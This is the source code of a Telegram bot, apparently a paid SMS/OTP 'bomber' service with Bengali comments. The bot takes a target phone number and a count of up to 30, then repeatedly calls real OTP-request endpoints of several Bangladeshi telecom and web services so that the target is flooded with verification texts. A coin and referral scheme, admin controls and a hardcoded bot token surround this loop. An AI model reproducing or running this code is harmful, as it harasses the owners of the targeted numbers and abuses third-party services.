const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const http = require('http');

// --- কনফিগারেশন ---
const token = '8784762504:AAH4uP_glf7oKo52fiUiInsxOYheI0Mm-U8';
const adminId = '7225943533'; 
const channelId = '@srmtelecom'; 
const channelLink = 'https://t.me/srmtelecom';
const bot = new TelegramBot(token, {polling: true});

// ডাটাবেস হ্যান্ডলিং
const dbFile = 'users.json';
let users = {};
if (fs.existsSync(dbFile)) { 
    try { users = JSON.parse(fs.readFileSync(dbFile)); } catch (e) { users = {}; }
}
function saveDB() { fs.writeFileSync(dbFile, JSON.stringify(users, null, 2)); }

// Uptime সচল রাখতে Render সার্ভার
http.createServer((req, res) => { res.write("S.R.M Master Engine is Live!"); res.end(); }).listen(process.env.PORT || 3000);

console.log("🚀 S.R.M TELECOM (Full Power Engine) চালু হয়েছে...");

const mainMenu = {
    reply_markup: {
        keyboard: [
            [{ text: '🚀 শুরু করুন (Attack)' }, { text: '👤 প্রোফাইল ও ব্যালেন্স' }],
            [{ text: '🎁 ডেইলি বোনাস' }, { text: '🔗 রেফার করুন' }],
            [{ text: '📢 অফিশিয়াল চ্যানেল' }]
        ],
        resize_keyboard: true
    }
};

// সাবস্ক্রিপশন চেক ফাংশন
async function isSubscribed(chatId) {
    try {
        const res = await bot.getChatMember(channelId, chatId);
        return ['member', 'administrator', 'creator'].includes(res.status);
    } catch (e) { return false; }
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const userId = msg.from.id.toString();
    if (!text) return;

    // ১. ইউজার রেজিস্ট্রেশন ও রেফারাল
    if (!users[userId]) {
        users[userId] = { balance: 0, lastBonus: 0, step: '', name: msg.from.first_name || "User", isBanned: false };
        if (text.startsWith('/start ') && text.split(' ')[1] !== userId) {
            const refId = text.split(' ')[1];
            if (users[refId]) {
                users[refId].balance += 1;
                bot.sendMessage(refId, `🎊 অভিনন্দন! আপনার রেফারে একজন জয়েন করায় আপনি **১ কয়েন** পেয়েছেন।`);
            }
        }
        saveDB();
    }

    // ২. ব্যান চেক
    if (users[userId].isBanned) return bot.sendMessage(chatId, "🚫 দুঃখিত! আপনাকে ব্যান করা হয়েছে।");

    // ৩. ফোর্স জয়েন (Inline Button-সহ)
    const joined = await isSubscribed(chatId);
    if (!joined && text !== '/start' && !text.startsWith('/start')) {
        return bot.sendMessage(chatId, `❌ **অ্যাক্সেস লক!**\n\nবটটি ব্যবহার করতে আমাদের চ্যানেলে জয়েন থাকা বাধ্যতামূলক। জয়েন করে আবার /start দিন।`, {
            reply_markup: {
                inline_keyboard: [[{ text: '📢 জয়েন করুন (Join Channel)', url: channelLink }]]
            }
        });
    }

    // ৪. অ্যাডমিন প্যানেল (add, /ban, /unban, /userlist)
    if (userId === adminId) {
        if (text.startsWith('add ')) {
            const [_, targetId, amount] = text.split(' ');
            if (users[targetId]) { users[targetId].balance += parseInt(amount); saveDB(); bot.sendMessage(chatId, `✅ ID: ${targetId}-এ ${amount} কয়েন যোগ হয়েছে।`); }
            return;
        }
        if (text.startsWith('/ban ')) {
            const targetId = text.split(' ')[1];
            if (users[targetId]) { users[targetId].isBanned = true; saveDB(); bot.sendMessage(chatId, `🚫 User ${targetId} ব্যান করা হয়েছে।`); }
            return;
        }
        if (text.startsWith('/unban ')) {
            const targetId = text.split(' ')[1];
            if (users[targetId]) { users[targetId].isBanned = false; saveDB(); bot.sendMessage(chatId, `✅ User ${targetId} আনব্যান করা হয়েছে।`); }
            return;
        }
        if (text === '/userlist') {
            let list = `📊 **S.R.M User List**\n━━━━━━━━━━━━━━\n`;
            Object.keys(users).forEach((id, i) => list += `${i+1}. ${users[id].name} (\`${id}\`) - 💰 ${users[id].balance} - ${users[id].isBanned ? '🚫' : '✅'}\n`);
            return bot.sendMessage(chatId, list, { parse_mode: "Markdown" });
        }
    }

    // ৫. মেনু অপশনস
    if (text === '/start' || text.startsWith('/start')) {
        return bot.sendMessage(chatId, `⚡ **S.R.M TELECOM** 👋\n━━━━━━━━━━━━━━\n💰 ব্যালেন্স: **${users[userId].balance} Coins**\n🔥 প্রিমিয়াম ওটিপি সার্ভিস অনলাইন!`, mainMenu);
    }

    if (text === '👤 প্রোফাইল ও ব্যালেন্স') {
        const bal = (userId === adminId) ? "Unlimited ♾" : users[userId].balance;
        return bot.sendMessage(chatId, `👤 ${users[userId].name}\n🆔 \`${userId}\`\n💰 Coins: ${bal}`, { parse_mode: "Markdown" });
    }

    if (text === '🎁 ডেইলি বোনাস') {
        const now = Date.now();
        if (now - users[userId].lastBonus < 86400000) return bot.sendMessage(chatId, "⏳ ২৪ ঘণ্টা পর ট্রাই করুন।");
        users[userId].balance += 2; users[userId].lastBonus = now; saveDB();
        return bot.sendMessage(chatId, "✅ ২ কয়েন বোনাস পেয়েছেন।");
    }

    if (text === '🔗 রেফার করুন') {
        return bot.sendMessage(chatId, `🔗 রেফার লিঙ্ক:\nhttps://t.me/reffer_incomebdbot?start=${userId}`);
    }

    if (text === '📢 অফিশিয়াল চ্যানেল') {
        return bot.sendMessage(chatId, `আমাদের চ্যানেলে যোগ দিন: ${channelLink}`);
    }

    // ৬. অ্যাটাক প্রসেস ও অ্যাডমিন লাইভ লগ
    if (text === '🚀 শুরু করুন (Attack)') {
        if (userId !== adminId && users[userId].balance < 1) return bot.sendMessage(chatId, "❌ কয়েন নেই!");
        users[userId].step = 'num'; saveDB();
        return bot.sendMessage(chatId, "📱 নম্বর দিন (১১ ডিজিট):", { reply_markup: { remove_keyboard: true } });
    }

    if (users[userId]?.step === 'num' && text.length === 11) {
        users[userId].target = text; users[userId].step = 'amount'; saveDB();
        return bot.sendMessage(chatId, "🔢 কয়টি SMS? (১-৩০):");
    }

    if (users[userId]?.step === 'amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount > 30) return bot.sendMessage(chatId, "⚠️ সর্বোচ্চ ৩০টি সম্ভব।");
        const target = users[userId].target;
        if (userId !== adminId) users[userId].balance -= 1;
        users[userId].step = ''; saveDB();

        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে অ্যাটাক শুরু...`, mainMenu);
        let success = 0; let fail = 0;

        for (let i = 0; i < amount; i++) {
            // ১. Robi Next.js (Fixed Headers)
            try { await axios.post('https://www.robi.com.bd/api/v1/user/otp-login/request', [{"msisdn": target}], { headers: { 'Accept': 'text/x-component', 'next-action': '7f059ca75e4421bcef70abad89cb5bb05cba717c30', 'X-Requested-With': 'mark.via.gp' }, timeout: 4000 }); success++; } catch (e) { fail++; }

            // ২. BdTickets 20100 (Original Header Fixed)
            try { await axios.post('https://api.bdtickets.com:20100/v1/auth', { "createUserCheck": true, "phoneNumber": "+88" + target, "applicationChannel": "WEB_APP" }, { headers: { 'Content-Type': 'application/json;charset=UTF-8', 'Accept': 'application/json, text/plain, */*', 'Origin': 'https://bdtickets.com', 'Referer': 'https://bdtickets.com/', 'X-Requested-With': 'mark.via.gp' }, timeout: 7000 }); success++; } catch (e) { fail++; }

            // ৩. Karigori (Options + Get)
            try { await axios.options(`https://api.karigoripathsala.com/api/get-otp?phone=${target}`); await axios.get(`https://api.karigoripathsala.com/api/get-otp?phone=${target}`); success++; } catch (e) { fail++; }

            // ৪. Iqra Live (GET)
            try { await axios.get(`https://apibeta.iqra-live.com/api/v2/sent-otp/${target}`); success++; } catch (e) { fail++; }

            // ৫. Banglalink
            try { await axios.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', { "mobile": target }); success++; } catch (e) { fail++; }

            await new Promise(r => setTimeout(r, 4500)); 
        }

        bot.sendMessage(chatId, `✅ **অ্যাটাক সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 সফল: ${success} | ব্যর্থ: ${fail}`, mainMenu);
        
        // অ্যাডমিনকে লাইভ লগ পাঠানো
        const adminLog = `⚠️ **LIVE LOG**\n👤 User: ${users[userId].name} (\`${userId}\`)\n🎯 Target: \`${target}\`\n✅ Success: ${success} | ❌ Fail: ${fail}`;
        bot.sendMessage(adminId, adminLog, { parse_mode: "Markdown" });
    }
});
